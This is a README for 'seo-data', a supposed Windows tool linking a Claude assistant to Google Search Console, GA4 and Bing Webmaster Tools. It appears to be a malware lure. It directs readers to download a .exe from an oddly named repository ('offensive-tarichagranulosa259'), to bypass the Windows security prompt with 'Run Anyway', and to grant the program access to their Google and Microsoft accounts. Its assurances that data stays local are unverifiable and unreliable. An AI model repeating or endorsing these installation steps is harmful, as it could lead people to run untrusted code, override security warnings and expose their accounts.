# 📊 seo-data - Get instant answers from your SEO data

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/offensive-tarichagranulosa259/seo-data)

seo-data connects your Claude assistant to the data you track for your website. It gathers information from Google Search Console, Google Analytics 4, and Bing Webmaster Tools. You use natural language to ask questions about your site performance. This tool removes the need to log into multiple dashboards or export manual spreadsheets.

## 🛠 Prerequisites

Before you use the application, ensure your computer meets these requirements:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 200 megabytes of free space.
- Web Browser: Chrome, Edge, or Firefox.
- Internet Connection: Active connection to sync data with analytics platforms.

## 📥 Getting the software

Visit [the official repository page](https://github.com/offensive-tarichagranulosa259/seo-data) to download the application. 

1. Navigate to the link above.
2. Locate the Releases section on the right sidebar.
3. Click the latest version link.
4. Look for the file ending in .exe.
5. Save this file to your Downloads folder.

## ⚙️ Setting up the application

Follow these steps to complete the installation on your Windows computer:

1. Open your Downloads folder.
2. Double-click the downloaded .exe file.
3. A Windows security box might appear. If it does, click More Info, then click Run Anyway.
4. Follow the prompts on the screen to choose your installation folder.
5. Click Finish after the progress bar completes.

The application creates a shortcut on your desktop. Double-click this shortcut to start the program.

## 🔑 Connecting your data sources

The application needs permission to view your website performance data. You perform this setup one time for each service.

### Google Search Console and GA4
1. Open the application.
2. Click the Settings icon in the top corner.
3. Select Credentials under the Google section.
4. Click Connect Account.
5. Your web browser opens a Google login page.
6. Sign in with the account that manages your website properties.
7. Click Confirm to allow the application access to your statistics.
8. Return to the application. The status indicator changes to Connected.

### Bing Webmaster Tools
1. Within the Settings menu, find the Bing section.
2. Click Connect Account.
3. Sign in to your Microsoft account.
4. Grant the requested permissions for your webmaster data.
5. The application confirms the connection automatically.

## 💡 How to use the tool

Once you finish the initial setup, you query your data using plain English. Type your questions into the main input box at the bottom of the window.

### Example Queries
- How many clicks did my site get last month?
- Show me the top pages for organic traffic.
- List the keywords that bring the most visitors.
- Compare my traffic from last week to the week before.

The application processes your request and retrieves the relevant numbers from the connected services. It presents the answer in a clear text format.

## 📈 Understanding the data types

Each service tracks specific metrics. You can ask for information based on these categories:

- Traffic volume: How many people visit your site.
- Behavior: Which pages people visit and how long they stay.
- Search performance: Which words people use to find your site on search engines.
- Technical health: Information about errors or crawl issues on your pages.

## 🔒 Security and Privacy

Your data stays on your computer. The application uses your login credentials to request data directly from the providers. It does not store your search queries or website statistics on a third-party server. Your interactions remain local. The authentication tokens are encrypted and stored in your Windows credential manager.

##  troubleshooting common issues

If you encounter difficulties, use these troubleshooting steps:

### Application does not open
Check if you have an active internet connection. Ensure your Windows updates are current. Restart your computer and try to open the shortcut again.

### Data does not appear
Check your internet connection first. Open the Settings menu and verify that the status lights for your accounts are green. If they are red, click Reconnect to refresh your permission tokens.

### Incorrect search results
Verify that the account you used to log in has administration access to the specific website property you want to query. If you manage multiple websites, ensure the correct property is selected in the dropdown menu inside the application settings.

### Slow response times
Analytics services occasionally experience high traffic. Wait one minute and try your request again. Large data sets may take longer to process than small ones.

## 📝 Updating the software

The application periodically checks for updates. When a new version is available, a notification pops up on the screen. Click the link provided in the notification to visit the repository. Download the new installer and run it. The new version replaces the old one without deleting your settings or credentials.

## 📁 Project structure

The application manages several files in your local documents folder:

- Logs: This folder stores history regarding connection attempts. It helps if you need to diagnose an error.
- Config: This folder holds your user settings and preferences.
- Cache: This folder stores temporary data to make your future searches faster. You can clear this folder if performance decreases.

## 🔧 Advanced configuration

While the application works immediately after setup, you can adjust some settings to match your workflow:

- Default timeframe: Set the application to look at the last 7, 30, or 90 days by default.
- Data refresh: Change the frequency at which the app checks for new information from the search engines.
- Theme: Toggle between light mode and dark mode for better visibility.

Access these by clicking the gear icon in the interface. Each change saves automatically as soon as you confirm the setting.